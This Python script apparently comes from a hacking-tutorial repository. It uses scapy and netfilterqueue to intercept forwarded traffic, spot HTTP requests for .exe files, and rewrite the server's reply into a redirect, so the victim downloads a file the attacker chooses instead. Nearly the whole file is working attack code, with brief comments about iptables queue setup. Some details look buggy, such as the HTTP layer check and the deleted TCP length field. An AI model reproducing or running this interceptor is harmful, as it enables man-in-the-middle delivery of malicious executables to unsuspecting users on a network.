'''
    author : zerobits01
    created: 30-Jan-2020
'''

import scapy.all as scapy
import netfilterqueue

'''
    first we save the packets in a queue ans using scapy
    we access them and send or receive them :
    creating the queue is with iptables :
    > iptables -I FORWARD -j NFQUEUE --queue-num 0
    they won't be send till we want
    > pip install netfilterqueue
    # for accessing that queue
    # first we should install netfilterqueue
        i couln't so i don't upload this
    > iptables --flush # to cancel the queue
'''

ackls = []

def process_packet_cb(packet):
    inside_packet = packet.get_payload()
    scapy_packet = scapy.IP(inside_packet)
    '''
        in packets if dport is http then it is an request
        if the sport is http then it is a response
        in req and resp two fields : ack and seq are for
        determinig that which response is for which request in X
    '''
    if scapy_packet.haslayer(scapy.HTTP):
        if scapy_packet[scapy.TCP].dport == 80:
            # req
            if '.exe' in scapy_packet[scapy.Raw].load:
                ackls.append(scapy_packet[scapy.TCP].ack)
                print('found')
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ackls:
                ackls.remove(scapy_packet[scapy.TCP].seq)
                scapy_packet[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: newkinktodownload\n'
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].len
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))
    packet.accept()
    # packet.drop()

nf = netfilterqueue.NetFilterQueue()
nf.bind(0, process_packet_cb)
nf.run()